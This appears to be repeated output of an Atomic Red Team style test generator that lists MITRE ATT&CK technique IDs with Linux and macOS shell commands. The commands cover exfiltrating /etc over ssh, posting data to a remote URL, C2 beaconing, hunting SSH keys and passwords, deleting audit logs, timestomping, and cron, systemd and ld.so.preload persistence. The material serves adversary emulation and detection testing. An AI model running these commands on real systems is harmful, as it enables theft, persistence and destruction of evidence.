rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1215 ,T1154 ,T1139 ,T1018 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1158 ,T1154 ,T1145 ,T1057 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1501 ,T1154 ,T1081 ,T1201 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1158 ,T1064 ,T1139 ,T1201 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1158 ,T1064 ,T1040 ,T1082 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1136 ,T1153 ,T1139 ,T1083 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1501 ,T1154 ,T1081 ,T1217 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1153 ,T1040 ,T1087 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1215 ,T1154 ,T1040 ,T1082 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1064 ,T1145 ,T1018 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1215 ,T1153 ,T1040 ,T1082 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1168 ,T1153 ,T1081 ,T1135 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1153 ,T1145 ,T1018 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1153 ,T1145 ,T1033 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
